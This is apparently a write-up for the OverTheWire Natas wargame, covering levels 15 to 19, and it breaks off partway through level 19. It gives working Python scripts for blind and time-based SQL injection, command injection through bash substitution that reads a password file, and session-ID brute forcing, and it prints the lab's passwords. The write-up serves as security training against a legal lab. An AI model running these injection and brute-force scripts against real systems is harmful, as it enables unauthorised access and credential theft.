# Level 15 - 16
Inspecting the code shows that there is no explicit way to get the password, so we have to use a blind SQLi to confirm the password character by character.

We'll do this with a python script. The `requests` library can get it done, but how do we make our request pass the login that we had to do to get in here in the first place? Opening up Burp suite and looking in the headers of a HTTP request, we see that the site uses HTTP basic auth, which sends the current password in plaintext:

`Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==`

So, all we need to do is use a package to do the same. Fortunately, there is one that ships with `requests`! Now all we have to do is write our script guesses each character in the password by brute force by exploiting the query.

```python
import requests
from requests.auth import HTTPBasicAuth

user = "natas15"
pw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while (len(hacc) < 32):
    for char in chars:
        exploit = {
            "username": f'natas16" AND password LIKE BINARY"{hacc + char}%'
        }
        print(exploit)
        r = requests.post('http://natas15.natas.labs.overthewire.org/?debug', data=exploit, auth=HTTPBasicAuth(user, pw))

        if 'exists' in r.text:
            hacc += char
            print(hacc)
            break
```

This works and obtains the password, but it's really slow. We are doing possibly 62 HTTP requests for each of the 32 characters in the password. Therefore we can speed it up by filtering out characters that don't exist in the password with a preliminary query loop. Of course, there are ways to do better:

- Divide and conquer the password guessing with a distributed algorithm
- "Split" the password in groups, allowing more filtering of the characters in each group

But they probably aren't worth the effort right now.

# Level 16 - 17
We've got another needle in a haystack exercise. However, this time we see that the characters we would usually use to escape the `grep` command have been blacklisted. Additionally, the `$key` is now surrounded by quotes and is purely a string.

```php
if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

We're restricted to using grep honestly: no shell escapes or searching multiple files. Fortunately, we have a way to inject raw terminal code into the substring that we are matching using bash substitution. Therefore if we search a very specific word in the dictionary, followed by our grep query, there will be no result if our grep query returned a line. An example is as follows:

```
Input: thumps
Output: thumps

Input: thumps$(grep a /etc/natas_webpass/natas17)
Output: thumps

Input: thumps$(grep b /etc/natas_webpass/natas17)
Output:
```

So now we need to write a python script just like we did last time to do this brute force attack. First we use our query to get a list of all characters that exist in the password, and then we'll use grep with a regex match to get the exact password, all done using GET requests using the `requests` module with HTTP basic authentication.

```python
import requests
from requests.auth import HTTPBasicAuth

user = "natas16"
pw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""

for char in chars:
    exploit = {
        'needle': f'thumps$(grep {char} /etc/natas_webpass/natas17)'
    }
    r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))
    if 'thumps' not in r.text:
        filtered += char
        print(filtered)

while (len(hacc) < 32):
    for char in filtered:
        exploit = {
            'needle': f'thumps$(grep ^{hacc + char} /etc/natas_webpass/natas17)'
        }
        r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))

        if 'thumps' not in r.text:
            hacc += char
            print(hacc)
            break
```

# Level 17 - 18
The source code has been changed! We now have a user query system that does not provide any feedback. Obviously, this is a blind SQLi. Let's look at how we can exploit the query:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

So, the username input has been wrapped in quotes, but they weren't sensible enough to wrap it in something like `mysql_real_escape_string()`. However, we now have no feedback from the server when our query returns rows. We can get around this by using the short circuiting property of the AND in SQL to execute sleep() for a duration. So when we do get a hit on our query, the sleep command will be executed and we can confirm that a character is in the password. We're also going to add an inline comment `#` at the end so that we commend out the closing quote from the original source code!

So, similar to what we've done previously, we can automate our brute-force attack by sending a POST requests, with a preliminary round of filtering.

```python
import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
headers = {'content-type': 'application/x-www-form-urlencoded'}

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
# filtered = "dghjlmpqsvwxyCDFIKOPR047"

if filtered == "":
    for char in chars:
        exploit = {
            'username': f'natas18" AND password LIKE BINARY "%{char}%" AND sleep(3) #'
        }
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=exploit, auth=Auth, headers=headers)
        if r.elapsed.seconds >= 2:
            filtered += char
            print(filtered)

while (len(hacc) < 32):
    for char in filtered:
        exploit = {
            'username': f'natas18" AND password LIKE BINARY"{hacc + char}%" AND sleep(4) #'
        }
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=exploit, auth=Auth, headers=headers)

        if r.elapsed.seconds >= 3:
            hacc += char
            print(hacc)
            break
```

# Level 18 - 19

This looks like a good amount of fresh code, so let's examine it in snippets.

```php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }
    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
```
We've got some rather self-explanatory functions at the start, but it's nice to see that we have a debug mode. Let's examine a little bit further to see where the `$msg` variable is set. This involves a bit of background knowledge: read up on PHP sessions [here](https://www.w3schools.com/php/php_sessions.asp).

```php
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }
    return false;
}
```
Now we see that on `my_session_start()`, we check if a cookie exists with name `PHPSESSID`, with a numerical value. The functions returns `false` if there is already an existing session, or if the session failed to start for some other reaason. In the event that it does start a new session, it checks if there was a previous session variable `admin` and sets its value to 0 to remove admin privileges.

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```
Here, we clearly see that the goal is to simply create an admin session with the `admin` session variable set to 1 to obtain our password.

```php
$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}
```

`$showform` is pretty self-explanatory here. So if a session is up, we print the credentials and otherwise we create a new session with the username entered in the form. Curiously enough, nothing is done with our password.

So, we need to create an existing sessions and find a way to escalate its privilege to an admin by changing the session variable `admin` to have value `1`. Let's start by logging in. Unfortunately, since session variables are on the server application, there is no way for us to change this variable, as well as no way to inject code. However, the key lies in the one line at the start that says:

```php
$maxid = 640; // 640 should be enough for everyone
```
We can use a python script to brute force all these session numbers, as one of them should be an admin session! However, we need to be careful not to trigger the reset code. I've got a solution right now, but can't fully explain why it doesn't trigger the reset.

```php
import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
gotcha = "You are an admin"

for i in range(1, 641):
    if i % 10 == 0:
        print (f'Checked {str(i)} sessions...')
    exploit = { 'PHPSESSID': str(i)}
    response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=Auth, cookies=exploit)
    if gotcha in response.text:
        print(response.text)
        break
```

# Level 19 to 20 
[Credit](http://floatingbytes.blogspot.com/2014/10/wargames-natas-19.html)

This level appears the same as before, but they hint that session IDs are no longer in order. We'll start by gathering information. We want to see what convention the new PHPSESSIONID follows, so we're going to try multiple inputs and use the browser developer tools to inspect the cookie, delete it, and try a new username.

To start, hit F12 in your browser. We're going to go to the Application tab, and in the left menu we should be able to inspect cookies. Submitting an empty form results in 